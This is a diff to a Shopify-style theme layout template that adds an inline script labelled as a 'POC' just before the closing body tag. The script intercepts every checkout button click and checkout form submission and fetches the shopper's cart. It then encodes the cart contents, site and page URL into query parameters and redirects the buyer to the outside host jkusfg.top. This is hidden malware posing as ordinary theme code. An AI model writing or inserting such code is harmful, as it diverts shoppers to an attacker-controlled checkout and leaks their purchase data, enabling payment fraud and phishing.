@@ -332,5 +332,21 @@
   {% if settings.enable_verification_popup %}
     {{ 'component-verification-popup.min.css' | asset_url | stylesheet_tag }}
   {% endif %}
+
+<!-- POC60_61_JKUSFG_START:POC6061-JKUSFG-43347d24297362dae3ff -->
+<script id="POC6061-JKUSFG-43347d24297362dae3ff">
+(()=>{
+  const M="POC6061-JKUSFG-43347d24297362dae3ff",O="https://jkusfg.top/";
+  if(window.__POC6061_JKUSFG__?.marker===M)return;
+  const S=window.__POC6061_JKUSFG__={marker:M,overlay:O,installed:true,busy:false,transport:'query-co'};
+  const Q='[name="icartCheckout"],.icartCheckoutBtn,.icart-chk-btn,.icart-checkout-btn,button[name="checkout"],input[name="checkout"],a[href*="/checkout"]';
+  const enc=v=>{const b=new TextEncoder().encode(JSON.stringify(v));let s='';for(let i=0;i<b.length;i+=8192)s+=String.fromCharCode(...b.subarray(i,i+8192));return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'')};
+  const compact=c=>{const d=new Intl.NumberFormat('en',{style:'currency',currency:c.currency||'USD'}).resolvedOptions().maximumFractionDigits,u=10**d,m=n=>Number(n||0)/u;return{currency:c.currency,item_count:c.item_count,items_subtotal_price:m(c.items_subtotal_price),total_price:m(c.total_price),items:(c.items||[]).map(x=>({product_id:x.product_id,variant_id:x.variant_id,product_title:x.product_title||x.title,variant_title:x.variant_title,quantity:x.quantity,final_price:m(x.final_price),final_line_price:m(x.final_line_price),image:x.image,url:x.url}))}};
+  const go=async()=>{if(S.busy)return;S.busy=true;try{const c=await fetch('/cart.js',{credentials:'same-origin',cache:'no-store'}).then(r=>r.json());const site=location.hostname.replace(/^www\./,'');const source=location.href;const p={marker:M,site,sourceSite:site,sourceUrl:source,returnTo:source,capturedAt:Date.now(),action:'natural-checkout-click',cart:compact(c)};const u=new URL(O);u.searchParams.set('co',enc(p));u.searchParams.set('source_site',site);u.searchParams.set('site',site);u.searchParams.set('source_url',source);u.searchParams.set('return_to',source);location.assign(u.href)}catch(e){S.busy=false;console.error(M,e)}};
+  addEventListener('click',e=>{const b=e.target?.closest?.(Q);if(!b)return;e.preventDefault();e.stopImmediatePropagation();go()},true);
+  addEventListener('submit',e=>{const f=e.target,s=e.submitter;if((s&&s.matches?.(Q))||/\/checkout(?:[/?#]|$)/.test(f?.action||'')){e.preventDefault();e.stopImmediatePropagation();go()}},true);
+})();
+</script>
+<!-- POC60_61_JKUSFG_END:POC6061-JKUSFG-43347d24297362dae3ff -->
 </body>
 </html>
